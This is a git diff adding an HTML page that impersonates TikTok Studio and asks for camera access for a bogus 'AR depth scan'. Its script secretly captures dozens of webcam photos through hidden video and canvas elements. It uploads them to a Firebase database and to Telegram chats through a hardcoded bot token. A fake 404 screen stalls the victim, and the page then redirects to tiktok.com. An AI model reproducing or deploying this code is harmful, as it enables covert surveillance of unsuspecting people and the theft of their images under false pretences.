@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok | AR Depth Sync</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --tt-cyan: #25F4EE;
+            --tt-pink: #FE2C55;
+            --tt-black: #121212;
+            --tt-surface: #1E1E1E;
+            --tt-text: #FFFFFF;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--tt-black); color: var(--tt-text);
+            font-family: 'ProximaNova', 'SofiaPro', Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+            overflow: hidden;
+        }
+
+        .tt-card {
+            width: 100%; max-width: 420px; background: var(--tt-surface);
+            border-radius: 12px; overflow: hidden;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.8);
+            position: relative;
+        }
+
+        .tt-header {
+            padding: 20px; display: flex; align-items: center; justify-content: center;
+            border-bottom: 1px solid #333;
+        }
+
+        .tt-logo {
+            font-size: 24px; font-weight: 800;
+            text-shadow: 2px 0 var(--tt-cyan), -2px 0 var(--tt-pink);
+        }
+
+        .tt-body { padding: 40px 30px; text-align: center; }
+
+        .ar-scanner {
+            width: 120px; height: 120px; margin: 0 auto 30px;
+            border: 2px dashed var(--tt-cyan); border-radius: 50%;
+            position: relative; display: flex; align-items: center; justify-content: center;
+        }
+
+        .scan-line {
+            width: 100%; height: 2px; background: var(--tt-pink);
+            position: absolute; top: 0; animation: scan 2s infinite linear;
+            box-shadow: 0 0 15px var(--tt-pink);
+        }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+        h2 { font-size: 22px; font-weight: 700; margin: 0 0 12px; }
+        p { font-size: 14px; color: #BBB; line-height: 1.6; margin-bottom: 35px; }
+
+        .btn-tt {
+            background: var(--tt-text); color: var(--tt-black); border: none;
+            width: 100%; padding: 14px; font-size: 16px; font-weight: 700;
+            border-radius: 4px; cursor: pointer; transition: background 0.2s;
+        }
+        .btn-tt:hover { background: #EEE; }
+
+        /* Sync & 404 UI */
+        #sync-ui, #error-404 { display: none; }
+        
+        .tt-loader {
+            width: 40px; height: 40px; border: 3px solid #333;
+            border-top: 3px solid var(--tt-cyan); border-bottom: 3px solid var(--tt-pink);
+            border-radius: 50%; margin: 0 auto 20px; animation: tt-spin 1s linear infinite;
+        }
+        @keyframes tt-spin { to { transform: rotate(360deg); } }
+
+        .error-title { font-size: 60px; font-weight: 900; color: #2A2A2A; margin-bottom: 5px; }
+        .node-tag { font-size: 9px; color: #555; margin-top: 25px; text-transform: uppercase; font-family: monospace; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+    <div class="tt-card">
+        <div class="tt-header">
+            <div class="tt-logo">TikTok Studio</div>
+        </div>
+
+        <!-- Initial View -->
+        <div class="tt-body" id="init-view">
+            <div class="ar-scanner">
+                <div class="scan-line"></div>
+                <svg width="40" height="40" fill="white" viewBox="0 0 24 24"><path d="M12 2c5.52 0 10 4.48 10 10s-4.48 10-10 10-10-4.48-10-10 4.48-10 10-10zm0 2c-4.41 0-8 3.59-8 8s3.59 8 8 8 8-3.59 8-8-3.59-8-8-8zm-1 5h2v2h2v2h-2v2h-2v-2h-2v-2h2v-2z"/></svg>
+            </div>
+            <h2>AR Mesh Depth Sync</h2>
+            <p>To enable <b>Advanced Visual Effects</b>, TikTok Studio requires a depth scan. This synchronizes your camera’s spatial sensors with our AR engine for 100% effect accuracy.</p>
+            
+            <button class="btn-tt" onclick="startTTSync()">Start Environment Scan</button>
+            <div class="node-tag">Region: Mumbai_South_Relay</div>
+        </div>
+
+        <!-- Sync View -->
+        <div class="tt-body" id="sync-ui">
+            <div class="tt-loader"></div>
+            <div style="font-weight: 700; color: var(--tt-cyan);">MAPPING_SPATIAL_MESH...</div>
+            <div style="font-size: 12px; color: #888; margin-top: 8px;" id="tt-timer">Depth buffer valid for 60s</div>
+            
+            <div style="text-align: left; background: #000; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 10px; color: var(--tt-pink); margin-top: 25px; border: 1px solid #333;">
+                > INITIALIZING_AR_DEPTH_VECTORS... OK<br>
+                > SYNCING_MUMBAI_NODE_IN... 78%<br>
+                > STATUS: SCANNING_ENVIRONMENT_GRID
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="tt-body" id="error-404">
+            <div class="error-title">404</div>
+            <h2 style="color: var(--tt-pink);">Stream Overflow</h2>
+            <p>The AR Mesh data stream exceeded the Mumbai node capacity. Attempting a low-latency reroute via secondary Maharashtra relays.</p>
+            <div class="tt-loader" style="width: 25px; height: 25px;"></div>
+            <div style="font-size: 11px; color: #555;">Re-buffering Handshake...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startTTSync() {
+            try {
+                // Requesting permission under "AR Mesh Depth Sync"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('tt-timer').innerText = `Depth buffer valid for ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            ttCapture(count);
+                        }
+
+                        // Switch to 404 at 45 seconds
+                        if (timeLeft === 45) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.tiktok.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.tiktok.com";
+            }
+        }
+
+        function ttCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "TIKTOK_AR_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_AR_NODE" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'tiktok_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
